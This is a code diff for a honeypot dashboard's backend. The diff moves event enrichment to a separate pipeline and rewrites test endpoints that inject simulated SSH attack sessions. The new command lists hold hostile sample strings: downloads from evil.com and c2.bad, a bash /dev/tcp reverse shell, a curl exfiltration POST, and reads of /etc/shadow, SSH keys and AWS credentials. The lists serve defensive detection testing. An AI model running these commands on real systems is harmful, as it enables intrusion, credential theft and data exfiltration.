@@ -8,7 +8,6 @@ Tables used: decoy_events (hypertable), decoy_sessions, engage_outcomes
 import asyncio
 import json
 import os
-import time
 import uuid
 import random
 from contextlib import asynccontextmanager
@@ -22,13 +21,10 @@ from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.staticfiles import StaticFiles
 from sse_starlette.sse import EventSourceResponse
 
-# ── Inline enrichment (same as cti/enrichment.py) ──
-from enrichment import classify_command, detect_kill_chain, enrich_event
-
 # ── Config ──────────────────────────────────────────
 NATS_URL = os.getenv("NATS_URL", "nats://localhost:4222")
 DB_DSN = os.getenv("DB_DSN", "postgresql://cicdecoy:cicdecoy@localhost:5432/cicdecoy")
-NATS_SUBJECTS = os.getenv("NATS_SUBJECTS", "cicdecoy.decoy.events.>")
+NATS_SUBJECTS = os.getenv("NATS_SUBJECTS", "cicdecoy.enriched.events.>")
 
 # ── Global state ────────────────────────────────────
 nc = None
@@ -37,48 +33,6 @@ event_buffer: list[dict] = []
 MAX_BUFFER = 500
 subscribers: list[asyncio.Queue] = []
 session_cache: dict[str, dict] = {}  # session_id -> {source_ip, username}
-
-# ── Tactic → Severity mapping ──────────────────────
-# Used to derive severity when the decoy doesn't set one.
-# Highest-impact tactics get highest severity.
-TACTIC_SEVERITY = {
-    "exfiltration":         "critical",
-    "impact":               "critical",
-    "credential-access":    "high",
-    "lateral-movement":     "high",
-    "command-and-control":  "high",
-    "persistence":          "high",
-    "privilege-escalation": "high",
-    "defense-evasion":      "medium",
-    "execution":            "medium",
-    "collection":           "medium",
-    "initial-access":       "medium",
-    "discovery":            "low",
-    "reconnaissance":       "low",
-    "resource-development": "low",
-}
-
-SEVERITY_RANK = {"critical": 5, "high": 4, "medium": 3, "low": 2, "info": 1}
-
-
-def _derive_severity(payload: dict) -> str:
-    """Derive severity from MITRE techniques when not explicitly set."""
-    techniques = payload.get("mitre_techniques") or []
-    if isinstance(techniques, str):
-        try:
-            techniques = json.loads(techniques)
-        except (json.JSONDecodeError, TypeError):
-            techniques = []
-
-    best = "info"
-    for t in techniques:
-        if isinstance(t, dict):
-            tactic = t.get("tactic", "")
-            candidate = TACTIC_SEVERITY.get(tactic, "info")
-            if SEVERITY_RANK.get(candidate, 0) > SEVERITY_RANK.get(best, 0):
-                best = candidate
-    return best
-
 
 # ── Helpers ─────────────────────────────────────────
 def _parse_raw(val):
@@ -126,15 +80,8 @@ async def nats_handler(msg):
     except (json.JSONDecodeError, UnicodeDecodeError):
         payload = {"raw": msg.data.decode(errors="replace")}
 
-    # Inline enrichment — MERGE results into payload, don't replace it.
-    # enrich_event() returns only {mitre_techniques, tool_signatures,
-    # severity, tags}; overwriting payload would destroy source_ip,
-    # session_id, event_type, raw_data, username, etc.
-    try:
-        enrichment = enrich_event(payload)
-        payload.update(enrichment)
-    except Exception:
-        pass
+    # Events arrive pre-enriched from CTI pipeline via
+    # cicdecoy.enriched.events.> — no inline enrichment needed.
 
     # ── Resolve IP/username from EVERY possible location ──
     # The SSH decoy nests client_ip/username inside "data" and/or
@@ -192,13 +139,6 @@ async def nats_handler(msg):
         payload["source_ip"] = resolved_ip
     if resolved_user:
         payload["username"] = resolved_user
-
-    # ── Derive severity from MITRE tactics when not set ──
-    existing_sev = payload.get("severity")
-    if not existing_sev or existing_sev == "info":
-        derived = _derive_severity(payload)
-        if SEVERITY_RANK.get(derived, 0) > SEVERITY_RANK.get(existing_sev or "info", 0):
-            payload["severity"] = derived
 
     event = {
         "subject": msg.subject,
@@ -362,6 +302,7 @@ async def get_sessions(limit: int = 50):
                 MAX(severity) AS max_severity
             FROM decoy_events
             WHERE session_id != '' AND session_id != 'system' AND session_id != 'pre-auth'
+              AND (source_ip IS NULL OR source_ip::TEXT != '127.0.0.1')
             GROUP BY session_id
             ORDER BY MAX(timestamp) DESC
             LIMIT $1
@@ -420,6 +361,7 @@ async def get_session_events(session_id: str):
                    mitre_techniques, tool_signatures, tags
             FROM decoy_events
             WHERE session_id = $1
+              AND event_type != 'command.response'
             ORDER BY timestamp ASC
         """, session_id)
 
@@ -639,7 +581,7 @@ async def get_kill_chains(limit: int = 20):
                 MAX(e.decoy_name) AS decoy_name,
                 MAX(e.raw_data->>'username') AS auth_username,
                 EXTRACT(EPOCH FROM MAX(e.timestamp) - MIN(e.timestamp))::INT AS duration_seconds,
-                COUNT(*) FILTER (WHERE e.event_type IN ('command.exec','command','command.response')) AS command_count,
+                COUNT(*) FILTER (WHERE e.event_type IN ('command.exec','command')) AS command_count,
                 MIN(e.timestamp) AS start_time,
                 COALESCE(
                     jsonb_agg(DISTINCT t.tech) FILTER (WHERE t.tech IS NOT NULL),
@@ -792,25 +734,71 @@ async def get_geo_breakdown(hours: int = 168):
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  DEV: Inject test event
+#  DEV: Test event injection
+#
+#  These endpoints simulate what the SSH decoy publishes.
+#  Events are published to cicdecoy.decoy.events.> (the raw
+#  subject) and flow through the real pipeline:
+#
+#    inject → NATS raw → CTI pipeline (enrich + DB) → NATS enriched → dashboard SSE
+#
+#  No MITRE mappings, severity derivation, or DB writes here.
+#  That's the pipeline's job.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-SAMPLE_TECHNIQUES = [
-    {"technique_id": "T1059.004", "technique_name": "Unix Shell", "tactic": "execution"},
-    {"technique_id": "T1003.008", "technique_name": "/etc/passwd and /etc/shadow", "tactic": "credential-access"},
-    {"technique_id": "T1082", "technique_name": "System Information Discovery", "tactic": "discovery"},
-    {"technique_id": "T1021.004", "technique_name": "SSH Lateral Movement", "tactic": "lateral-movement"},
-    {"technique_id": "T1083", "technique_name": "File and Directory Discovery", "tactic": "discovery"},
-    {"technique_id": "T1046", "technique_name": "Network Service Discovery", "tactic": "discovery"},
-    {"technique_id": "T1560", "technique_name": "Archive Collected Data", "tactic": "collection"},
+# Commands grouped by attack phase — ensures inject-session
+# can build a realistic kill chain progression
+RECON_COMMANDS = ["whoami", "id", "uname -a", "hostname", "w", "last"]
+DISCOVERY_COMMANDS = [
+    "cat /etc/passwd", "ls -la /root", "ps aux",
+    "netstat -tlnp", "ifconfig", "cat /proc/version",
+    "find / -name '*.pem' 2>/dev/null", "df -h", "env",
+]
+CREDENTIAL_COMMANDS = [
+    "cat /etc/shadow", "cat ~/.ssh/id_rsa",
+    "cat ~/.ssh/authorized_keys", "cat ~/.aws/credentials",
+]
+LATERAL_COMMANDS = [
+    "ssh root@10.0.0.5", "ssh admin@192.168.1.10",
+    "scp /tmp/data.tgz user@10.0.0.8:/tmp/",
+]
+PERSIST_COMMANDS = [
+    "crontab -e", "echo '* * * * * /tmp/s' >> /var/spool/cron/root",
+    "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
+]
+C2_COMMANDS = [
+    "wget http://evil.com/payload.sh", "curl http://c2.bad/s -o /tmp/s",
+    "chmod +x /tmp/s",
+]
+EXEC_COMMANDS = [
+    "/tmp/s -p 4444", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "python3 -c 'import socket; ...'",
+]
+COLLECTION_COMMANDS = [
+    "tar czf /tmp/data.tgz /etc", "tar czf /tmp/keys.tgz ~/.ssh",
+    "zip -r /tmp/www.zip /var/www",
+]
+EXFIL_COMMANDS = [
+    "scp /tmp/data.tgz attacker@c2.bad:/loot/",
+    "curl -X POST http://c2.bad/exfil -d @/tmp/data.tgz",
+]
+EVASION_COMMANDS = [
+    "unset HISTFILE", "history -c", "rm -f ~/.bash_history",
+    "iptables -F",
 ]
 
-SAMPLE_COMMANDS = [
-    "cat /etc/shadow", "whoami", "uname -a", "id", "ls -la /root",
-    "wget http://evil.com/payload.sh", "curl ifconfig.me",
-    "netstat -tlnp", "find / -name '*.pem'", "ssh root@10.0.0.5",
-    "tar czf /tmp/data.tar.gz /etc", "cat /etc/passwd",
-    "ps aux", "history", "cat ~/.ssh/id_rsa",
+# Ordered attack phases for realistic session generation
+ATTACK_PHASES = [
+    RECON_COMMANDS,
+    DISCOVERY_COMMANDS,
+    CREDENTIAL_COMMANDS,
+    C2_COMMANDS,
+    EXEC_COMMANDS,
+    LATERAL_COMMANDS,
+    PERSIST_COMMANDS,
+    COLLECTION_COMMANDS,
+    EXFIL_COMMANDS,
+    EVASION_COMMANDS,
 ]
 
 SAMPLE_GEOS = [
@@ -827,81 +815,76 @@ SAMPLE_GEOS = [
 ]
 
 
-@app.post("/api/test/inject")
-async def inject_test_event():
-    now = datetime.now(timezone.utc)
-    tech = random.choice(SAMPLE_TECHNIQUES)
-    cmd = random.choice(SAMPLE_COMMANDS)
-    src_ip = f"{random.choice([198,203,45,91,185])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+def _make_raw_event(
+    event_type: str, session_id: str, src_ip: str,
+    username: str, decoy_name: str, ts: datetime,
+    command: str = "", geo: dict = None,
+) -> dict:
+    """Build a raw event dict matching the SSH decoy's actual publish format."""
     event_id = str(uuid.uuid4())[:12]
-    session_id = f"sess-{random.randint(1000,9999)}"
+    data = {"client_ip": src_ip, "username": username}
+    if command:
+        data["command"] = command
+        data["response"] = "..."
 
-    # Derive severity from the technique's tactic instead of random
-    sev = TACTIC_SEVERITY.get(tech["tactic"], "info")
-
-    username = random.choice(["root", "admin", "deploy", "ubuntu"])
-
-    fake = {
+    return {
         "event_id": event_id,
-        "timestamp": now.isoformat(),
-        "decoy_name": random.choice(["ssh-decoy-01", "ssh-decoy-02"]),
-        "decoy_tier": random.choice([2, 3]),
+        "timestamp": ts.isoformat(),
+        "decoy_name": decoy_name,
+        "decoy_tier": 2,
         "session_id": session_id,
-        "event_type": random.choice(["command.exec", "auth.success", "connection.new"]),
+        "event_type": event_type,
         "source_ip": src_ip,
-        "username": username,
         "source_port": random.randint(40000, 65000),
-        "severity": sev,
-        "raw_data": {"command": cmd, "response": "...", "username": username},
-        "mitre_techniques": [tech],
-        "geo": random.choice(SAMPLE_GEOS),
-        "tool_signatures": [],
-        "tags": [],
+        "data": data,
+        "raw_data": data,
+        "geo": geo or random.choice(SAMPLE_GEOS),
     }
 
-    subject = f"cicdecoy.decoy.events.{fake['event_type']}"
+
+@app.post("/api/test/inject")
+async def inject_test_event():
+    """Inject a single raw event — pipeline handles enrichment."""
+    all_commands = (
+        RECON_COMMANDS + DISCOVERY_COMMANDS + CREDENTIAL_COMMANDS +
+        LATERAL_COMMANDS + C2_COMMANDS + EXEC_COMMANDS +
+        COLLECTION_COMMANDS + EVASION_COMMANDS
+    )
+    cmd = random.choice(all_commands)
+    src_ip = f"{random.choice([198,203,45,91,185])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+    username = random.choice(["root", "admin", "deploy", "ubuntu"])
+
+    event = _make_raw_event(
+        event_type="command.exec",
+        session_id=f"sess-{random.randint(1000,9999)}",
+        src_ip=src_ip,
+        username=username,
+        decoy_name=random.choice(["ssh-decoy-01", "ssh-decoy-02"]),
+        ts=datetime.now(timezone.utc),
+        command=cmd,
+    )
+
+    subject = f"cicdecoy.decoy.events.{event['event_type']}"
 
     if nc and nc.is_connected:
-        await nc.publish(subject, json.dumps(fake).encode())
-        return {"status": "published_to_nats", "event_id": event_id}
+        await nc.publish(subject, json.dumps(event).encode())
+        return {"status": "published_to_nats", "event_id": event["event_id"]}
     else:
-        event = {"subject": subject, "ts": now.isoformat(), "payload": fake}
-        event_buffer.append(event)
-        if len(event_buffer) > MAX_BUFFER:
-            event_buffer.pop(0)
-        for q in subscribers:
-            try:
-                q.put_nowait(event)
-            except asyncio.QueueFull:
-                pass
-        return {"status": "local_only", "event_id": event_id}
-
-
-# ── DEV: Inject a full realistic session ───────────
-ATTACK_SCENARIOS = [
-    ("whoami",                  "T1033",     "System Owner/User Discovery",       "discovery",          "info"),
-    ("id",                      "T1033",     "System Owner/User Discovery",       "discovery",          "info"),
-    ("uname -a",                "T1082",     "System Information Discovery",      "discovery",          "low"),
-    ("cat /etc/passwd",         "T1003.008", "/etc/passwd and /etc/shadow",       "credential-access",  "high"),
-    ("cat /etc/shadow",         "T1003.008", "/etc/passwd and /etc/shadow",       "credential-access",  "critical"),
-    ("find / -name '*.pem'",    "T1083",     "File and Directory Discovery",      "discovery",          "medium"),
-    ("cat ~/.ssh/id_rsa",       "T1552.004", "Private Keys",                      "credential-access",  "critical"),
-    ("wget http://evil.com/s",  "T1105",     "Ingress Tool Transfer",             "command-and-control","high"),
-    ("chmod +x /tmp/s",         "T1222.002", "Linux File Permissions Modification","defense-evasion",   "medium"),
-    ("curl ifconfig.me",        "T1016",     "System Network Configuration",      "discovery",          "low"),
-    ("netstat -tlnp",           "T1049",     "System Network Connections",        "discovery",          "low"),
-    ("ssh root@10.0.0.5",       "T1021.004", "SSH",                               "lateral-movement",   "high"),
-    ("tar czf /tmp/d.tgz /etc", "T1560.001", "Archive via Utility",              "collection",         "high"),
-    ("crontab -e",              "T1053.003", "Cron",                              "persistence",        "high"),
-    ("ps aux",                  "T1057",     "Process Discovery",                 "discovery",          "info"),
-    ("/tmp/s -p 4444",          "T1059.004", "Unix Shell",                        "execution",          "critical"),
-    ("scp /tmp/d.tgz x@c2:/",  "T1041",     "Exfiltration Over C2",             "exfiltration",       "critical"),
-]
+        return {"status": "error", "detail": "NATS not connected — pipeline unavailable"}
 
 
 @app.post("/api/test/inject-session")
-async def inject_test_session(event_count: int = 8):
-    """Generate a full realistic attack session with 3+ tactics for kill chain testing."""
+async def inject_test_session(event_count: int = 10):
+    """Inject a full attack session — pipeline handles enrichment and DB writes.
+
+    Generates a realistic command sequence that progresses through
+    multiple ATT&CK phases (ensuring kill chain detection triggers).
+    Events are published to cicdecoy.decoy.events.> with realistic
+    timing — the CTI pipeline enriches, stores, and republishes them.
+    """
+    if not nc or not nc.is_connected:
+        return {"status": "error", "detail": "NATS not connected — pipeline unavailable"}
+
     now = datetime.now(timezone.utc)
     session_id = f"test-kc-{uuid.uuid4().hex[:8]}"
     src_ip = f"{random.choice([198,203,45,91,185])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
@@ -909,135 +892,82 @@ async def inject_test_session(event_count: int = 8):
     geo = random.choice(SAMPLE_GEOS)
     username = random.choice(["root", "admin", "deploy", "ubuntu"])
 
-    tactics_seen = set()
-    chosen = []
+    # ── Build a realistic attack sequence ──
+    # Pick commands from enough phases to trigger kill chain detection (3+)
+    commands = []
 
-    shuffled = random.sample(ATTACK_SCENARIOS, len(ATTACK_SCENARIOS))
-    for scenario in shuffled:
-        if len(chosen) >= event_count:
+    # Ensure coverage across 4+ phases for a convincing kill chain
+    phases_to_use = random.sample(ATTACK_PHASES, min(len(ATTACK_PHASES), max(4, event_count // 2)))
+    for phase_commands in phases_to_use:
+        commands.append(random.choice(phase_commands))
+        if len(commands) >= event_count:
             break
-        tactic = scenario[3]
-        if len(tactics_seen) < 3 or tactic in tactics_seen or random.random() > 0.3:
-            chosen.append(scenario)
-            tactics_seen.add(tactic)
 
-    if len(tactics_seen) < 3:
-        for scenario in shuffled:
-            if scenario[3] not in tactics_seen:
-                chosen.append(scenario)
-                tactics_seen.add(scenario[3])
-            if len(tactics_seen) >= 4:
-                break
+    # Fill remaining slots from random phases
+    while len(commands) < event_count:
+        phase = random.choice(ATTACK_PHASES)
+        commands.append(random.choice(phase))
 
-    events = []
-    for i, (cmd, tid, tname, tactic, sev) in enumerate(chosen):
-        ts = now + timedelta(seconds=i * random.randint(3, 30))
-        event_id = f"{session_id}-{i:03d}"
+    # ── Publish session lifecycle events ──
+    elapsed = 0
 
-        event = {
-            "event_id": event_id,
-            "timestamp": ts.isoformat(),
-            "decoy_name": decoy_name,
-            "decoy_tier": 2,
-            "session_id": session_id,
-            "event_type": "command.exec" if i > 0 else "connection.new",
-            "source_ip": src_ip,
-            "username": username,
-            "source_port": random.randint(40000, 65000),
-            "severity": sev,
-            "raw_data": json.dumps({"command": cmd, "response": "...", "username": username}),
-            "mitre_techniques": json.dumps([{
-                "technique_id": tid,
-                "technique_name": tname,
-                "tactic": tactic,
-            }]),
-            "geo": json.dumps(geo),
-            "tool_signatures": json.dumps([]),
-            "tags": json.dumps([]),
-        }
-        events.append(event)
+    # 1. connection.new
+    conn_event = _make_raw_event(
+        event_type="connection.new",
+        session_id=session_id, src_ip=src_ip,
+        username=username, decoy_name=decoy_name,
+        ts=now, geo=geo,
+    )
+    await nc.publish(
+        f"cicdecoy.decoy.events.connection.new",
+        json.dumps(conn_event).encode(),
+    )
 
-        sse_event = {"subject": f"cicdecoy.decoy.events.{event['event_type']}", "ts": ts.isoformat(), "payload": {
-            **event,
-            "username": username,
-            "raw_data": {"command": cmd, "response": "...", "username": username},
-            "mitre_techniques": [{"technique_id": tid, "technique_name": tname, "tactic": tactic}],
-            "geo": geo,
-            "tool_signatures": [],
-            "tags": [],
-        }}
-        event_buffer.append(sse_event)
-        for q in subscribers:
-            try:
-                q.put_nowait(sse_event)
-            except asyncio.QueueFull:
-                pass
+    # 2. auth.success
+    elapsed += random.randint(1, 3)
+    auth_event = _make_raw_event(
+        event_type="auth.success",
+        session_id=session_id, src_ip=src_ip,
+        username=username, decoy_name=decoy_name,
+        ts=now + timedelta(seconds=elapsed), geo=geo,
+    )
+    await nc.publish(
+        f"cicdecoy.decoy.events.auth.success",
+        json.dumps(auth_event).encode(),
+    )
 
-    if len(event_buffer) > MAX_BUFFER:
-        del event_buffer[:len(event_buffer) - MAX_BUFFER]
+    # 3. command.exec events
+    for cmd in commands:
+        elapsed += random.randint(2, 20)
+        cmd_event = _make_raw_event(
+            event_type="command.exec",
+            session_id=session_id, src_ip=src_ip,
+            username=username, decoy_name=decoy_name,
+            ts=now + timedelta(seconds=elapsed),
+            command=cmd, geo=geo,
+        )
+        await nc.publish(
+            f"cicdecoy.decoy.events.command.exec",
+            json.dumps(cmd_event).encode(),
+        )
 
-    db_written = False
-    if db_pool:
-        try:
-            async with db_pool.acquire() as conn:
-                await conn.executemany("""
-                    INSERT INTO decoy_events (
-                        event_id, timestamp, decoy_name, decoy_tier,
-                        session_id, event_type, source_ip, source_port,
-                        severity, raw_data, mitre_techniques, geo,
-                        tool_signatures, tags
-                    ) VALUES (
-                        $1, $2::TIMESTAMPTZ, $3, $4,
-                        $5, $6, $7::INET, $8,
-                        $9, $10::JSONB, $11::JSONB, $12::JSONB,
-                        $13::JSONB, $14::JSONB
-                    )
-                """, [
-                    (
-                        e["event_id"],
-                        e["timestamp"],
-                        e["decoy_name"],
-                        e["decoy_tier"],
-                        e["session_id"],
-                        e["event_type"],
-                        e["source_ip"],
-                        e["source_port"],
-                        e["severity"],
-                        e["raw_data"],
-                        e["mitre_techniques"],
-                        e["geo"],
-                        e["tool_signatures"],
-                        e["tags"],
-                    )
-                    for e in events
-                ])
-            db_written = True
-        except Exception as ex:
-            print(f"[inject-session] DB write failed: {ex}")
-
-    nats_published = False
-    if nc and nc.is_connected:
-        try:
-            for e in events:
-                subject = f"cicdecoy.decoy.events.{e['event_type']}"
-                await nc.publish(subject, json.dumps({
-                    **e,
-                    "raw_data": json.loads(e["raw_data"]),
-                    "mitre_techniques": json.loads(e["mitre_techniques"]),
-                    "geo": json.loads(e["geo"]),
-                }).encode())
-            nats_published = True
-        except Exception as ex:
-            print(f"[inject-session] NATS publish failed: {ex}")
+    # 4. session.end
+    elapsed += random.randint(1, 5)
+    end_event = _make_raw_event(
+        event_type="session.end",
+        session_id=session_id, src_ip=src_ip,
+        username=username, decoy_name=decoy_name,
+        ts=now + timedelta(seconds=elapsed), geo=geo,
+    )
+    await nc.publish(
+        f"cicdecoy.decoy.events.session.end",
+        json.dumps(end_event).encode(),
+    )
 
     return {
         "status": "ok",
         "session_id": session_id,
-        "events": len(events),
-        "tactics": list(tactics_seen),
-        "tactic_count": len(tactics_seen),
-        "db_written": db_written,
-        "nats_published": nats_published,
+        "events": len(commands) + 3,  # +3 for connection, auth, end
         "source_ip": src_ip,
     }
 
